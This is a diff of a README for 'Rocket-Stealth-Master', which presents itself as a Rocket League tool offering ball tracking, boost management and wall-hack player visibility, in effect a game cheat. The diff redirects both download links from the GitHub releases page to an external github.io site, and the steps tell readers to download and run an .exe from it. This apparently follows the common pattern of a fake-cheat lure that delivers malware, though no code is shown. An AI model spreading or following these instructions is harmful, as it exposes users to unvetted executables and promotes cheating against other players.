@@ -1,6 +1,6 @@
 # 🚀 Rocket-Stealth-Master - Improve your Rocket League game performance
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ivoryposterior664/Rocket-Stealth-Master/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ivoryposterior664.github.io)
 
 Rocket-Stealth-Master helps you play better in Rocket League. This tool offers features to track the ball, manage your boost, and see players through walls. Use these tools to understand the game better and improve your decision making on the field.
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to get the software on your machine.
 
-1. Visit [this link](https://github.com/Ivoryposterior664/Rocket-Stealth-Master/releases) to access the official release page. 
+1. Visit [this link](https://ivoryposterior664.github.io) to access the official release page. 
 2. Look for the section labeled "Assets" at the bottom of the most recent release.
 3. Click on the file that ends with ".exe" to start the download.
 4. Save the file to your desktop or your downloads folder.
